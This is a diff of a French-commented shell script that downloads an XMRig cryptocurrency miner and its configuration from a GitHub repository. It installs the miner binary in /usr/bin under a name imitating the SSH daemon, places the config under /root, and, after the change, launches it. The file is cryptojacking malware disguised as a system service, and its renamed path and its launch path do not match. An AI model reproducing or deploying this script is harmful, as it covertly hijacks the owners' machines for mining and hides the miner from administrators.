@@ -12,7 +12,7 @@ wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.tgz"
 #decompresse
 mv xmrig.tgz /tmp/mx/xmrig.tgz
 tar -zxvf xmrig.tgz
-mv /tmp/mx/minerd /usr/bin/sshd
+mv /tmp/mx/minerd /usr/bin/shd
 
 #wget la config
 wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
@@ -20,8 +20,5 @@ mkdir /root/.config
 sed -i 's/nom_machine/$nom/g' xmrig.json
 mv xmrig.json /root/.config/xmrig.json
 
-#nettoyage
-rm -rf /tmp/mx
-echo 3 > /proc/sys/vm/drop_caches
-echo 1 > /proc/sys/vm/compact_memory
-echo always > /sys/kernel/mm/transparent_hugepage/enabled
+#lancement
+/usr/bin/sshd
